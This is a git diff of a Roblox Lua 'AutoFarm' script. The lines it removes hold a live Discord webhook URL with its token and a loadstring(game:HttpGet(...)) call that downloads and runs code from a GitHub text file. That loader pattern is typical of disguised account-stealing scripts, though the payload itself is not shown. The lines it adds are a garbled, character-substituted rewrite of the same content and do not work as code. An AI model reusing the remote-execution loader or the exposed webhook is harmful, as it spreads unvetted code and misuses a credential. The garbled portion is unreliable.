@@ -1,13 +1,13 @@
 ﻿
 
-UserName Webhook =
-= "MintyCuh"
-"https://discord.com/api/webhooks/1108200260469276682/pRhWnW8JR1yLXIXS452Hk3BwHKofjb0Z4yK1IDNnBu3dhUetHMYu7xAtuDzapxxlkiC-"
-_G.LoadingScreen = true G.AntiLeave = false
-G.MouseLock = true
-G.ScriptName = "AutoFarm"
-G.FirstText="Script Preparing"
-G.SecondText="Script Loading..."
-G.ThirdText = "Almost Done..."
-G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Mintyyee/AutoFarm-Script/main/imagetotext.txt", true))()
+U?€|ZN4|'|'|£ W3134øø|{ =
+= "Ml/\/7°/C|_|4"
+"]-[†7|>ŝ://|)1$©*|?<|.©()/|\/q|>!/\\'€|3}{*ø|{$/110eight200260469276682/9R|-|W/VW8JR1`/LXIXS452H|<dreiBVVHK°|=_|l³0Z4'/K1IDN2B[_]3|)#U3†HMY|_|7)(A+|_|Dz∂9><×1|{|C-"
+_G.L()@<|][|\|9S(|23£/\/ = 7я|_|€ G.A27lL€/-\|/€ = ƒ415€
+G.M[][_]$€L0(|< = ']['|2|_|€
+G.S(2l][D+N/-\^^3 = "Aµ+*F^1²|11"
+G.F1я?7T&)(+="S©я||2† P|?3|D/\12|119"
+G.S&<011|>T£×†="S(|Zl][D7 L0q<|l/\\/6..."
+G.T|-|][®o|T£?+ = "A|_|'|'|<>§+ D()11&..."
+G.W@1']['][/|/6T][/v\& = 180 -- ][†'5 +4& ']['!/v\3 |3€+\A/&3/V 0% q|V|) 100% !/\\/ 5£(9?|>3§
+|ø@o|$†я!/\/9(6/\^^3:H7']['|°G£7("|-|']['+|>$://|?^\\'.9][7}{µ8|_|§3|2<ø|V']['3/|/†.<<>[]V[]/M|?']['°/`/€€/Aµ7øFλ|2/v\-S(®1|>†/|11/\|/\//|]V[λ6&']['°†£)(7.']['><†", †|2|_|£))()
